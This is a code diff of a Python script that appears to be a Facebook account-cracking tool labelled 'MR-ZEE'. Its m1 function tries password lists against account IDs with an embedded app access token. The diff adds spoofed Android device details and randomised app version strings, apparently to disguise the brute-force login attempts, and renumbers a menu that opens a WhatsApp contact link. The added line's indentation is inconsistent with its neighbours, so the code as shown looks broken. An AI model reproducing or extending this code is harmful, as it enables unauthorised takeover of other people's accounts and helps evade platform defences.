@@ -293,9 +293,9 @@ def menu():
 				gmail()
 			elif zee in ['4','04']:
 				chos()
-			elif zee in ['7','07']:
+			elif zee in ['5','05']:
 				os.system('xdg-open https:/wa.me/+923030362621');menu()
-			elif zee in ['8','08']:
+			elif zee in ['6','06']:
 				exit('')
 			else:
 				exit(' Option not found in menu...')
@@ -306,6 +306,15 @@ def m1(ids,passlist):
         sys.stdout.write('\r\r\033[1;37m [MR-ZEE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
+			infos = open('device_info.txt','r').read()
+                        try:
+                                version_,model_,brand_name_,width_,height_,build_,operator_,density_=infos.split('$')
+                        except:
+                                version_ = str(random.randint(7,13))
+                                model_ = "Infinix"
+                                brand_name_ = "Infinix"
+                                width_ = "720"
+                                height_ = "1280"
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                         fbbv = str(random.randint(111111111,999999999))
